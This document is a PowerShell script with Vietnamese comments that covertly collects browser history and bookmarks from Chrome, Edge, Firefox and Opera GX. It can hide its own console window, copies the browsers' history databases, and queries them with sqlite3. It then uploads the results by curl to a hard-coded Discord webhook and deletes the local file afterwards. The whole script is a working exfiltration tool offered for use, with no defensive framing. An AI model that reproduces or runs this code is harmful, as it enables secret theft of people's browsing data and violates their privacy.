# > Uncomment $hide='y' below to hide the console
# $hide='y'
if($hide -eq 'y'){
    $w=(Get-Process -PID $pid).MainWindowHandle
    $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
    $t=Add-Type -M $a -Name Win32ShowWindowAsync -Names Win32Functions -Pass
    if($w -ne [System.IntPtr]::Zero){
        $t::ShowWindowAsync($w,0)
    }else{
        $Host.UI.RawUI.WindowTitle = 'xx'
        $p=(Get-Process | Where-Object{$_.MainWindowTitle -eq 'xx'})
        $w=$p.MainWindowHandle
        $t::ShowWindowAsync($w,0)
    }
}

param(
    [string]$sqlitePath = "$env:TEMP\sqlite\sqlite3.exe"
)

# Webhook Discord của bạn
$dc = "1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"
$whuri = "$dc"
if ($whuri.Length -lt 120){
    $whuri = ("https://discord.com/api/webhooks/" + "$dc")
}

# Đường dẫn file tạm để lưu kết quả
$outpath = "$env:TEMP\browser_history.txt"
"Browser History    `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding UTF8

# Định nghĩa regex để lọc URL
$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

# Định nghĩa đường dẫn dữ liệu
$Paths = @{
    'chrome_history'    = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    'chrome_bookmarks'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    'edge_history'      = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
    'edge_bookmarks'    = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
    'firefox_history'   = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
    'opera_history'     = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
    'opera_bookmarks'   = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
}

# Duyệt qua các trình duyệt và loại dữ liệu
$Browsers = @('chrome', 'edge', 'firefox', 'opera')
$DataValues = @('history', 'bookmarks')

foreach ($Browser in $Browsers) {
    foreach ($DataValue in $DataValues) {
        $PathKey = "${Browser}_${DataValue}"
        $Path = $Paths[$PathKey]

        if (Test-Path $Path) {
            if ($DataValue -eq 'history' -and $Browser -in @('chrome','edge','opera','firefox')) {
                # Copy file History sang Temp để tránh bị khóa
                $copyPath = "$env:TEMP\${Browser}_HistoryCopy"
                Copy-Item $Path $copyPath -Force

                # Query bằng sqlite3.exe nếu có
                if (Test-Path $sqlitePath) {
                    & $sqlitePath $copyPath "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 20;" | Out-File -FilePath $outpath -Append -Encoding UTF8
                } else {
                    "Không tìm thấy sqlite3.exe để query $Browser history." | Out-File -FilePath $outpath -Append
                }

                Remove-Item $copyPath -Force
            } else {
                # Với bookmarks hoặc file text, chỉ lọc bằng regex
                $Value = Get-Content -Path $Path | Select-String -AllMatches $Regex | % {($_.Matches).Value} | Sort -Unique
                $Value | ForEach-Object {
                    [PSCustomObject]@{
                        Browser  = $Browser
                        DataType = $DataValue
                        Content  = $_
                    }
                } | Out-File -FilePath $outpath -Append
            }
        }
    }
}

# Gửi file lên Discord
curl.exe -F file1=@"$outpath" $whuri | Out-Null
Start-Sleep -Seconds 2
Remove-Item -Path $outpath -Force
